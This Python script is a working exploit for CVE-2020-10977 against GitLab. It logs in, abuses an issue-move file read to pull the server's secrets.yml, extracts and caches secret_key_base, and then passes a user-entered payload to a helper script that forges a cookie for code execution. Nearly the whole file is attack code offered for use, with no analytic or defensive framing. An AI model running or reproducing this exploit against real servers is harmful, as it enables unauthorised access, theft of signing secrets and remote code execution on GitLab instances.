import os
import sys
import yaml
import argparse
from subprocess import check_output, check_call, CalledProcessError
sys.path.insert(1, 'cve-2020-10977')
from cve_2020_10977 import get_args, login, project_names, create_project, create_issue, move_issue


cache_file = 'secret_key_base.cache'

# def get_args():
#     parser = argparse.ArgumentParser(description="CVE-2020-10977 code excecution")
#     parser.add_argument('url', help='Target URL')
#     parser.add_argument('username', help='GitLab Username')
#     parser.add_argument('password', help='GitLab Password')
#     parser.add_argument('payload', help='Bash command')
#     args = parser.parse_args()

#     base_url = args.url
#     if base_url.startswith('http://') or base_url.startswith('https://'):``
#         pass
#     else:
#         print('[-] Include http:// or https:// in the URL!')
#         exit(1)
#     if base_url.endswith('/'):
#         base_url = base_url[:-1]




def get_secret_key(base_url, username, password):
    secrets_path = '/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml'
    login(base_url, username, password)
    for project in project_names:
        create_project(project, base_url)

    create_issue(project_names[0], secrets_path, base_url, username)
    contents = move_issue(project_names[0], project_names[1], secrets_path, base_url, username)

    data = yaml.load(contents, Loader=yaml.FullLoader)
    secret_key_base = data['production']['secret_key_base']

    print('[!] Got secret key:', secret_key_base)

    if secret_key_base:
        with open(cache_file, 'w') as f:
            f.write(secret_key_base)
    return secret_key_base

if __name__ =='__main__':

    base_url, username, password = get_args()

    print('''[I] Got parameters:
    url: {}
    username: {}
    password: {}
    '''.format(base_url, username, password))

    if os.path.exists(cache_file):
        with open(cache_file) as f:
            secret_key_base = f.read()
        if secret_key_base:
            print('[!] Using cached secret_key_base')
            print('[!] Got secret key:', secret_key_base)
        else:
            secret_key_base = get_secret_key(base_url, username, password)
    else:
        secret_key_base = get_secret_key(base_url, username, password)

    payload = input('[I] Enter patload: ')

    try:
        cookie = check_output([os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cookie_maker.sh'), secret_key_base, payload])
        print ('[I]:', cookie.decode('utf-8'))
    except CalledProcessError as e:
        print('[E]:', e)
        exit(1)
